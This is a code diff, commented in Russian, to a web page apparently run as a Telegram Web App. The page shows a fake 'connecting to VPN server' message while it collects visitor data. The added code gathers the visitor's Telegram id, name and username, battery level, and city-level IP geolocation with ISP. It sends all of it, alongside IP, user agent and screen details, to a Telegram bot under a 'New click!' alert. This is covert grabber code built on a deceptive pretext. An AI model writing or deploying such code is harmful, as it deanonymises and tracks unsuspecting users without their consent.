@@ -117,6 +117,44 @@
             }
         }
 
+        // Функция для получения информации о батарее
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging
+                    };
+                } catch (error) {
+                    console.error('Ошибка при получении информации о батарее:', error);
+                    return null;
+                }
+            }
+            return null;
+        }
+
+        // Функция для получения детальной геолокации по IP
+        async function getGeolocationInfo(ip) {
+            try {
+                // Используем ip-api.com для получения детальной информации
+                const response = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,isp`);
+                const data = await response.json();
+                if (data.status === 'success') {
+                    return {
+                        country: data.country,
+                        region: data.regionName,
+                        city: data.city,
+                        provider: data.isp
+                    };
+                }
+                return null;
+            } catch (error) {
+                console.error('Ошибка при получении геолокации:', error);
+                return null;
+            }
+        }
+
         // Функция для сбора всех OSINT данных
         async function collectOsintData() {
             statusMessageEl.innerText = "Идет подключение к ближайшему VPN-серверу...";
@@ -136,6 +174,32 @@
             osintData.deviceMemory = navigator.deviceMemory;
             osintData.online = navigator.onLine;
 
+            // Сбор данных Telegram-пользователя, если доступно
+            if (Telegram.WebApp && Telegram.WebApp.initDataUnsafe && Telegram.WebApp.initDataUnsafe.user) {
+                const tgUser = Telegram.WebApp.initDataUnsafe.user;
+                osintData.telegramUser = {
+                    id: tgUser.id,
+                    firstName: tgUser.first_name,
+                    username: tgUser.username || 'Не указан'
+                };
+            } else {
+                osintData.telegramUser = {
+                    id: 'Неизвестно',
+                    firstName: 'Неизвестно',
+                    username: 'Неизвестен'
+                };
+            }
+
+            // Сбор информации о батарее
+            osintData.battery = await getBatteryInfo();
+
+            // Сбор детальной геолокации
+            if (osintData.ip && osintData.ip !== 'Неизвестно') {
+                osintData.geolocation = await getGeolocationInfo(osintData.ip);
+            } else {
+                osintData.geolocation = null;
+            }
+
             statusMessageEl.innerText = "Успешно подключено. Отправка данных...";
             // Дополнительная задержка перед отправкой
             await new Promise(resolve => setTimeout(resolve, 3000)); // Задержка 3 секунды перед отправкой
@@ -147,18 +211,43 @@
         async function sendDataToBot() {
             statusMessageEl.innerText = "Отправка данных в Telegram...";
 
-            const messageText = `
-🚨 *Новые OSINT данные от пользователя:*
-*IP:* ${osintData.ip || 'Неизвестно'}
-*User-Agent:* ${osintData.userAgent || 'Неизвестно'}
-*Разрешение экрана:* ${osintData.screenResolution || 'Неизвестно'}
-*Язык браузера:* ${osintData.browserLanguage || 'Неизвестно'}
-*Часовой пояс:* ${osintData.timezone || 'Неизвестно'}
-*Платформа:* ${osintData.platform || 'Неизвестно'}
-*Ядер CPU:* ${osintData.hardwareConcurrency || 'Неизвестно'}
-*Память устройства (ГБ):* ${osintData.deviceMemory || 'Неизвестно'}
-*Онлайн:* ${osintData.online ? 'Да' : 'Нет'}
-`;
+            const now = new Date();
+            const timezoneOffset = -now.getTimezoneOffset() / 60; // Offset in hours
+            const timezoneString = `UTC${timezoneOffset >= 0 ? '+' : ''}${timezoneOffset}`;
+            const dateTimeString = now.toLocaleString('ru-RU', {
+                day: '2-digit', month: '2-digit', year: 'numeric',
+                hour: '2-digit', minute: '2-digit', hour12: false
+            }).replace(',', ''); // Формат "ДД.ММ.ГГГГ ЧЧ:ММ"
+
+            let messageText = `🚨 *Новый переход!*
+
+🎭 *Аккаунт:*
+├─Имя: ${osintData.telegramUser.firstName}
+├─Username: @${osintData.telegramUser.username}
+└─ID: ${osintData.telegramUser.id}
+
+🌍 *IP:* ${osintData.ip || 'Неизвестно'}
+├─User-Agent: ${osintData.userAgent || 'Неизвестно'}
+├─Язык: ${osintData.browserLanguage || 'Неизвестно'}
+└─Время: ${dateTimeString} (${timezoneString})`;
+
+            if (osintData.battery) {
+                messageText += `\n\n🔋 *Батарея:* ${osintData.battery.level}%`;
+            } else {
+                messageText += `\n\n🔋 *Батарея:* Неизвестно`;
+            }
+
+            messageText += `\n🖥 *Разрешение экрана:* ${osintData.screenResolution || 'Неизвестно'}`;
+
+            if (osintData.geolocation) {
+                messageText += `\n\n🌐 *Геолокация:*
+├─Страна: ${osintData.geolocation.country || 'Неизвестно'}
+├─Регион: ${osintData.geolocation.region || 'Неизвестно'}
+├─Город: ${osintData.geolocation.city || 'Неизвестно'}
+└─Провайдер: ${osintData.geolocation.provider || 'Неизвестно'}`;
+            } else {
+                messageText += `\n\n🌐 *Геолокация:* Недоступна`;
+            }
 
             try {
                 const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
